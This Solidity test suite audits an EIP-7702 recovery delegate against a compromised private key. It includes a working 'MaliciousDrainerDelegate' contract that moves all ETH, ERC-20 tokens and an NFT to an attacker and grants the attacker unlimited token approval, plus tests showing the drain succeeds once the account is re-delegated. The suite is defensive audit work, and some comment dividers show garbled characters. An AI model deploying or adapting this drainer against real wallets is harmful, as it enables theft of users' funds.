// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import "./TestBase.sol";
import "../src/UniversalRecoveryDelegate.sol";
import "./mocks/MockERC20.sol";

// âââ Mock Attacker Delegate Contract ââââââââââââââââââââââââââââââââââââââââââ

contract MaliciousDrainerDelegate {
    function drainAll(address recipient, address token, address nft, uint256 tokenId) external payable {
        // 1. Drain 100% Native ETH
        uint256 nativeBal = address(this).balance;
        if (nativeBal > 0) {
            (bool s, ) = recipient.call{value: nativeBal}("");
            require(s, "Native drain failed");
        }

        // 2. Drain 100% ERC-20
        if (token != address(0)) {
            uint256 tokenBal = MockERC20(token).balanceOf(address(this));
            if (tokenBal > 0) {
                bool s = MockERC20(token).transfer(recipient, tokenBal);
                require(s, "ERC20 drain failed");
            }
        }

        // 3. Approve Attacker for infinite ERC-20
        if (token != address(0)) {
            MockERC20(token).approve(recipient, type(uint256).max);
        }

        // 4. Drain Mock NFT if present
        if (nft != address(0)) {
            (bool s, ) = nft.call(
                abi.encodeWithSignature("transferFrom(address,address,uint256)", address(this), recipient, tokenId)
            );
            // Ignore failure if NFT mock not strictly conforming
            s;
        }
    }
}

contract MockNFT {
    mapping(uint256 => address) public ownerOf;
    mapping(address => mapping(address => bool)) public isApprovedForAll;

    function mint(address to, uint256 tokenId) external {
        ownerOf[tokenId] = to;
    }

    function transferFrom(address from, address to, uint256 tokenId) external {
        require(ownerOf[tokenId] == from, "Not owner");
        ownerOf[tokenId] = to;
    }

    function setApprovalForAll(address operator, bool approved) external {
        isApprovedForAll[msg.sender][operator] = approved;
    }
}

// âââ Adversarial EIP-7702 Compromised Key Audit Suite âââââââââââââââââââââââââ

contract Eip7702CompromisedKeyAdversarialAuditTest is AntiDrainTestBase {
    uint256 internal victimPk = 0xAAAA;
    address internal victimEOA;

    uint256 internal legitimateSponsorPk = 0xBBBB;
    address internal legitimateSponsor;

    uint256 internal attackerPk = 0xCCCC;
    address internal attacker;

    address internal safeWallet = address(0x2222222222222222222222222222222222222222);

    UniversalRecoveryDelegate internal legitimateDelegate;
    MaliciousDrainerDelegate internal maliciousDelegate;
    MockERC20 internal token;
    MockNFT internal nft;

    function setUp() public {
        victimEOA = vm.addr(victimPk);
        legitimateSponsor = vm.addr(legitimateSponsorPk);
        attacker = vm.addr(attackerPk);

        // Deploy legitimate delegate bound to legitimate sponsor
        legitimateDelegate = new UniversalRecoveryDelegate();

        // Deploy attacker's malicious drainer delegate
        maliciousDelegate = new MaliciousDrainerDelegate();

        // Deploy assets
        token = new MockERC20();
        nft = new MockNFT();

        // Fund victim EOA with real assets
        vm.deal(victimEOA, 10 ether);
        token.mint(victimEOA, 10_000 ether);
        nft.mint(victimEOA, 1);

        // Fund sponsor & attacker with gas
        vm.deal(legitimateSponsor, 5 ether);
        vm.deal(attacker, 5 ether);
    }

    // =========================================================================
    // SECTION 1: Attack A â Attacker calls UniversalRecoveryDelegate directly
    // =========================================================================

    function test_AttackA_AttackerCallsUniversalRecoveryDelegate_Reverts() public {
        // Simulate victim delegated to UniversalRecoveryDelegate
        vm.etch(victimEOA, address(legitimateDelegate).code);

        Call[] memory calls = new Call[](0);
        address[] memory tokens = new address[](1);
        tokens[0] = address(token);

        bytes memory sig = signRescueIntent(
            victimPk,
            victimEOA,
            safeWallet,
            legitimateSponsor,
            calls,
            tokens,
            0,
            block.timestamp + 1 hours
        );

        // Attacker attempts to call executeRescue on victimEOA
        vm.prank(attacker);
        vm.expectRevert(InvalidAuthorization.selector);
        UniversalRecoveryDelegate(payable(victimEOA)).executeRescue(
            safeWallet,
            calls,
            tokens,
            0,
            block.timestamp + 1 hours,
            sig
        );

        // VERDICT: UniversalRecoveryDelegate correctly rejects caller because msg.sender != legitimateSponsor
    }

    // =========================================================================
    // SECTION 2: Attack B â Attacker uses compromised key to delegate to MaliciousDrainer
    // =========================================================================

    function test_AttackB_AttackerDelegatesToMaliciousDrainer_BypassesUniversalRecoveryDelegate() public {
        // Step 1: Attacker possesses victimPk.
        // Under EIP-7702, attacker signs authorization tuple delegating victimEOA -> MaliciousDrainerDelegate.
        // In Foundry, EIP-7702 delegation is simulated via vm.etch / contract execution in victim context.
        vm.etch(victimEOA, address(maliciousDelegate).code);

        assertEq(victimEOA.balance, 10 ether, "Victim starts with 10 ETH");
        assertEq(token.balanceOf(victimEOA), 10_000 ether, "Victim starts with 10k tokens");
        assertEq(nft.ownerOf(1), victimEOA, "Victim starts with NFT #1");

        // Step 2: Attacker broadcasts a sponsored Type 0x04 transaction (attacker is their own sponsor)
        // Calling victimEOA.drainAll(attacker, token, nft, 1)
        vm.prank(attacker);
        (bool success, ) = victimEOA.call(
            abi.encodeWithSelector(
                MaliciousDrainerDelegate.drainAll.selector,
                attacker,
                address(token),
                address(nft),
                1
            )
        );

        assertTrue(success, "Malicious drain transaction SUCCEEDS");

        // Step 3: Verify that assets were drained to attacker
        assertEq(victimEOA.balance, 0, "Victim ETH drained to 0");
        assertEq(token.balanceOf(victimEOA), 0, "Victim ERC20 drained to 0");
        assertEq(nft.ownerOf(1), attacker, "NFT #1 transferred to attacker");

        assertEq(attacker.balance, 15 ether, "Attacker received all 10 ETH (initial 5 + 10)");
        assertEq(token.balanceOf(attacker), 10_000 ether, "Attacker received all 10k ERC20");
        assertEq(token.allowance(victimEOA, attacker), type(uint256).max, "Attacker granted infinite allowance");

        // CRITICAL PROOF:
        // UniversalRecoveryDelegate was NEVER called.
        // Legitimate sponsor key was NEVER used.
        // Safe wallet was NEVER involved.
    }

    // =========================================================================
    // SECTION 3: Attack C â Attacker replaces legitimate delegation with malicious delegate
    // =========================================================================

    function test_AttackC_AttackerReplacesLegitimateDelegationWithMaliciousDelegation() public {
        // Phase 1: Victim is legitimately delegated to UniversalRecoveryDelegate
        vm.etch(victimEOA, address(legitimateDelegate).code);

        // Verify legitimate delegate is active
        // SPONSOR() immutable removed  per-user sponsor is now bound via EIP-712 signature

        // Phase 2: Attacker uses victimPk to sign a new EIP-7702 authorization to MaliciousDrainerDelegate
        // EVM replaces the delegation code at victimEOA
        vm.etch(victimEOA, address(maliciousDelegate).code);

        // Phase 3: Attacker executes drain
        vm.prank(attacker);
        (bool success, ) = victimEOA.call(
            abi.encodeWithSelector(
                MaliciousDrainerDelegate.drainAll.selector,
                attacker,
                address(token),
                address(0),
                0
            )
        );

        assertTrue(success, "Delegation replacement and drain SUCCEEDS");
        assertEq(victimEOA.balance, 0, "Victim balance drained after delegation replacement");
        assertEq(token.balanceOf(victimEOA), 0, "Victim tokens drained after delegation replacement");
    }

    // =========================================================================
    // SECTION 4: Independence from Sponsor & SafeWallet Keys
    // =========================================================================

    function test_AttackD_SponsorAndSafeWalletKeysNotRequired() public {
        // Attacker has:
        // - victimPk: YES
        // - legitimateSponsorPk: NO
        // - safeWallet: NO

        // Attacker sets code
        vm.etch(victimEOA, address(maliciousDelegate).code);

        // Attacker calls victim
        vm.prank(attacker);
        (bool success, ) = victimEOA.call(
            abi.encodeWithSelector(
                MaliciousDrainerDelegate.drainAll.selector,
                attacker,
                address(token),
                address(0),
                0
            )
        );

        assertTrue(success);
        assertEq(token.balanceOf(attacker), 10_000 ether);
    }
}
